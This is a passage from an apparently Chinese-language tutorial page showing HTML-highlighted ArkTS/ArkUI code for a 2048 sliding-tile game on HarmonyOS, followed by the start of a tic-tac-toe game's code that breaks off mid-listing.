class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">          cellArr.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>()); <span class="comment">// 创建新单元格</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>.<span class="title function_">push</span>(cellArr); <span class="comment">// 添加到盘面</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">board</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">board</span>[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">board</span>[i][j].<span class="property">value</span> = <span class="number">0</span>; <span class="comment">// 清空单元格</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 在盘面上添加指定数量的随机方块</span></span><br><span class="line">  <span class="title function_">addRandomTiles</span>(<span class="params">count: number</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">emptyCells</span>: object[] = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          emptyCells.<span class="title function_">push</span>(<span class="title class_">Object</span>(&#123; <span class="attr">row</span>: row, <span class="attr">col</span>: col &#125;)); <span class="comment">// 记录空单元格位置</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (emptyCells.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> randomIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * emptyCells.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">let</span> obj = emptyCells[randomIndex];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[obj[<span class="string">&#x27;row&#x27;</span>]][obj[<span class="string">&#x27;col&#x27;</span>]].<span class="property">value</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.9</span> ? <span class="number">2</span> : <span class="number">4</span>; <span class="comment">// 随机生成2或4</span></span><br><span class="line">        emptyCells.<span class="title function_">splice</span>(randomIndex, <span class="number">1</span>); <span class="comment">// 移除已使用的空单元格位置</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 向左滑动</span></span><br><span class="line">  <span class="title function_">slideLeft</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempRow</span>: number[] = []; <span class="comment">// 临时存储行数据</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// 标记是否已经合并过</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempRow.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// 移动非零值</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">let</span> mergePos = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &lt; tempRow.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempRow[mergePos] === tempRow[mergePos + <span class="number">1</span>] &amp;&amp; !merged[mergePos]) &#123;</span><br><span class="line">          tempRow[mergePos] *= <span class="number">2</span>; <span class="comment">// 合并</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempRow[mergePos]; <span class="comment">// 更新分数</span></span><br><span class="line">          merged[mergePos] = <span class="literal">true</span>; <span class="comment">// 标记已合并</span></span><br><span class="line">          tempRow.<span class="title function_">splice</span>(mergePos + <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// 移除合并过的值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">while</span> (tempRow.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempRow.<span class="title function_">push</span>(<span class="number">0</span>); <span class="comment">// 填充空位</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> = tempRow[col]; <span class="comment">// 更新盘面</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 向右滑动</span></span><br><span class="line">  <span class="title function_">slideRight</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempRow</span>: number[] = []; <span class="comment">// 临时存储行数据</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// 标记是否已经合并过</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">3</span>; col &gt;= <span class="number">0</span>; col--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempRow.<span class="title function_">unshift</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// 移动非零值</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> mergePos = tempRow.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempRow[mergePos] === tempRow[mergePos - <span class="number">1</span>] &amp;&amp; !merged[mergePos - <span class="number">1</span>]) &#123;</span><br><span class="line">          tempRow[mergePos] *= <span class="number">2</span>; <span class="comment">// 合并</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempRow[mergePos]; <span class="comment">// 更新分数</span></span><br><span class="line">          merged[mergePos - <span class="number">1</span>] = <span class="literal">true</span>; <span class="comment">// 标记已合并</span></span><br><span class="line">          tempRow.<span class="title function_">splice</span>(mergePos - <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// 移除合并过的值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">while</span> (tempRow.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempRow.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// 填充空位</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> = tempRow[col]; <span class="comment">// 更新盘面</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 向上滑动</span></span><br><span class="line">  <span class="title function_">slideUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempCol</span>: number[] = []; <span class="comment">// 临时存储列数据</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// 标记是否已经合并过</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempCol.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// 移动非零值</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">let</span> mergePos = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &lt; tempCol.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempCol[mergePos] === tempCol[mergePos + <span class="number">1</span>] &amp;&amp; !merged[mergePos]) &#123;</span><br><span class="line">          tempCol[mergePos] *= <span class="number">2</span>; <span class="comment">// 合并</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempCol[mergePos]; <span class="comment">// 更新分数</span></span><br><span class="line">          merged[mergePos] = <span class="literal">true</span>; <span class="comment">// 标记已合并</span></span><br><span class="line">          tempCol.<span class="title function_">splice</span>(mergePos + <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// 移除合并过的值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">while</span> (tempCol.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempCol.<span class="title function_">push</span>(<span class="number">0</span>); <span class="comment">// 填充空位</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> newRow = <span class="number">0</span>; newRow &lt; <span class="number">4</span>; newRow++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[newRow][col].<span class="property">value</span> = tempCol[newRow]; <span class="comment">// 更新盘面</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 向下滑动</span></span><br><span class="line">  <span class="title function_">slideDown</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempCol</span>: number[] = []; <span class="comment">// 临时存储列数据</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// 标记是否已经合并过</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 从下往上遍历列</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">3</span>; row &gt;= <span class="number">0</span>; row--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempCol.<span class="title function_">unshift</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// 移动非零值</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> mergePos = tempCol.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempCol[mergePos] === tempCol[mergePos - <span class="number">1</span>] &amp;&amp; !merged[mergePos - <span class="number">1</span>]) &#123;</span><br><span class="line">          tempCol[mergePos] *= <span class="number">2</span>; <span class="comment">// 合并</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempCol[mergePos]; <span class="comment">// 更新分数</span></span><br><span class="line">          merged[mergePos - <span class="number">1</span>] = <span class="literal">true</span>; <span class="comment">// 标记已合并</span></span><br><span class="line">          tempCol.<span class="title function_">splice</span>(mergePos - <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// 移除合并过的值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 如果数组长度小于4，用0填充</span></span><br><span class="line">      <span class="keyword">while</span> (tempCol.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempCol.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// 填充空位</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 将处理后的数组元素放回到棋盘的对应列中</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[<span class="number">3</span> - row][col].<span class="property">value</span> = tempCol[<span class="number">3</span> - row]; <span class="comment">// 注意反转顺序</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建游戏界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 布局容器</span></span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">10</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">// 显示得分</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">`得分: <span class="subst">$&#123;<span class="variable language_">this</span>.score&#125;</span>`</span>)</span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">24</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 底层背景布局</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span>, <span class="attr">direction</span>: <span class="title class_">FlexDirection</span>.<span class="property">Row</span> &#125;) &#123;</span><br><span class="line">        <span class="comment">// 遍历每个单元格</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">board</span>.<span class="title function_">flat</span>(), <span class="function">(<span class="params">cell: Cell, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// 显示单元格上的数字</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;cell.value || <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>px`</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>px`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>px`</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;cell.value &gt;= <span class="number">100</span> ? <span class="variable language_">this</span>.cellSize / <span class="number">3</span> : <span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>px`</span>) <span class="comment">// 根据数字大小调整字体大小</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">colors</span>[cell.<span class="property">value</span> == <span class="number">0</span>?<span class="number">0</span>:<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">log2</span>(cell.<span class="property">value</span>))]) <span class="comment">// 设置背景颜色</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(cell.<span class="property">value</span> === <span class="number">0</span> ? <span class="string">&#x27;#000&#x27;</span> : <span class="string">&#x27;#fff&#x27;</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 圆角</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellMargin * <span class="number">2</span>) * <span class="number">4</span>&#125;</span>px`</span>) <span class="comment">// 设置容器宽度</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 重新开始按钮</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">aboutToAppear</span>(); <span class="comment">// 重新开始游戏</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">onTouch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Down</span> &amp;&amp; e.<span class="property">touches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// 触摸开始，记录初始位置</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartX</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartY</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Up</span> &amp;&amp; e.<span class="property">changedTouches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// 当手指抬起时，更新最后的位置</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenX</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenY</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">gesture</span>(</span><br><span class="line">      <span class="title class_">SwipeGesture</span>(&#123; <span class="attr">direction</span>: <span class="title class_">SwipeDirection</span>.<span class="property">All</span> &#125;) <span class="comment">// 支持方向中 all可以是上下左右</span></span><br><span class="line">        .<span class="title function_">onAction</span>(<span class="function">(<span class="params">_event: GestureEvent</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> swipeX = <span class="variable language_">this</span>.<span class="property">lastScreenX</span> - <span class="variable language_">this</span>.<span class="property">screenStartX</span>;</span><br><span class="line">          <span class="keyword">const</span> swipeY = <span class="variable language_">this</span>.<span class="property">lastScreenY</span> - <span class="variable language_">this</span>.<span class="property">screenStartY</span>;</span><br><span class="line">          <span class="comment">// 清除开始位置记录，准备下一次滑动判断</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartX</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartY</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeX) &gt; <span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeY)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeX &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideRight</span>(); <span class="comment">// 向右滑动</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideLeft</span>(); <span class="comment">// 向左滑动</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeY &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideDown</span>(); <span class="comment">// 向下滑动</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideUp</span>(); <span class="comment">// 向上滑动</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">addRandomTiles</span>(<span class="number">1</span>); <span class="comment">// 添加一个随机方块</span></span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="X✔"><a href="#X✔" class="headerlink" title="X✔"></a>X✔</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> winningLines = [</span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>], <span class="comment">// Horizontal 1</span></span><br><span class="line">  [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>], <span class="comment">// Horizontal 2</span></span><br><span class="line">  [<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>], <span class="comment">// Horizontal 3</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>], <span class="comment">// Vertical 1</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>], <span class="comment">// Vertical 2</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>], <span class="comment">// Vertical 3</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>], <span class="comment">// Diagonal \</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>]<span class="comment">// Diagonal /</span></span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GridCell</span> &#123;</span><br><span class="line">  @<span class="title 